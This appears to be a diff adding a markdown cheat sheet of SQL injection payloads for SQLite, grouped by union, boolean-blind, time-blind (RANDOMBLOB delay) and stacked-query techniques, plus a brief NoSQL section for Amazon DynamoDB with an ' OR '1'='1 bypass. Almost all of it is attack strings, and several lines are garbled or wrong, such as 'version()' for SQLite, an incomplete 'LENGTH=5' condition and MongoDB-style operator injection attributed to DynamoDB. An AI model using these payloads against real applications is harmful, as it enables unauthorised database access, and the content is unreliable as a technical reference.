@@ -1,0 +1,43 @@
+# SQLite
+
+## Error-based
+Limited; use union or blind, as errors may not leak data directly.
+
+To force error with data: difficult, use ' AND 1/0 -- but no data leak.
+
+## Union query-based
+' UNION SELECT NULL, sqlite_version() --
+
+No current user; use version as similar basic info.
+
+## Boolean-based blind
+' AND LENGTH(version())>16 -- (adapt for data; assume 'admin' string for example)
+
+But for actual, binary as in SQL.
+
+## Time-based blind
+Use RANDOMBLOB for slow computation.
+
+Base: ' AND LIKE('A',UPPER(HEX(RANDOMBLOB(100000000/2)))) --
+
+Condition: ' AND CASE WHEN LENGTH=5 THEN LIKE(...) ELSE 1 END --
+
+Adapt binary.
+
+## Stacked queries
+'; SELECT sqlite_version() --
+
+# Amazon DynamoDB
+
+DynamoDB is NoSQL, injection if attributes concatenated.
+
+## Boolean-based
+Make condition always true: ' OR '1'='1 to bypass and "retrieve" access.
+
+To check = 'admin': set param to 'admin'.
+
+Blind: app-dependent conditions for length/chars if exposed.
+
+## Error-based
+Invalid operators: {"username": {"$invalid": 1}} to error.
+
